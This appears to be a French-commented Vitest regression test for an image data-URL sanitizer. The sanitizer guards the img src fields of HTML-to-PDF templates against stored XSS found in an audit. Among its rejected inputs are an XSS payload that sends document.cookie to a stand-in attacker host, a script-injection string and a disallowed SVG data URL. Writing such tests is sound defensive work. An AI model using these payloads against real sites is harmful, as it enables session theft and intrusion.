import { describe, it, expect } from "vitest";
import { isSafeImageDataUrl } from "@/lib/documents/escape";

/**
 * Non-régression XSS stockée (audit OFM-03 / OFM-13).
 * `isSafeImageDataUrl` garde les points d'injection `<img src="…">` des gabarits
 * HTML→PDF (photo candidat, signatures) contre une data URL forgée qui casserait
 * l'attribut src pour injecter un gestionnaire d'événement.
 */
describe("isSafeImageDataUrl", () => {
  it("accepte les vraies images data-URL base64", () => {
    expect(isSafeImageDataUrl("data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==")).toBe(true);
    expect(isSafeImageDataUrl("data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBD")).toBe(true);
    expect(isSafeImageDataUrl("data:image/jpg;base64,/9j/4AAQ")).toBe(true);
    expect(isSafeImageDataUrl("data:image/webp;base64,UklGRh4AAABXRUJQ")).toBe(true);
    expect(isSafeImageDataUrl("data:image/gif;base64,R0lGODlhAQABAAAAACw=")).toBe(true);
  });

  it("REJETTE une charge XSS qui échappait à startsWith(\"data:image/\")", () => {
    // Exactement le contournement décrit par l'audit : startsWith le laissait passer.
    expect(
      isSafeImageDataUrl(`data:image/png;base64,x" onerror="fetch('https://evil.tld/'+document.cookie)`),
    ).toBe(false);
    expect(isSafeImageDataUrl('data:image/png;base64,x"><script>alert(1)</script>')).toBe(false);
    expect(isSafeImageDataUrl("data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=")).toBe(false); // SVG interdit
    expect(isSafeImageDataUrl("data:text/html;base64,PHNjcmlwdD4=")).toBe(false);
  });

  it("REJETTE le vide / null / une URL distante", () => {
    expect(isSafeImageDataUrl("")).toBe(false);
    expect(isSafeImageDataUrl(null)).toBe(false);
    expect(isSafeImageDataUrl(undefined)).toBe(false);
    expect(isSafeImageDataUrl("https://evil.tld/x.png")).toBe(false);
  });
});
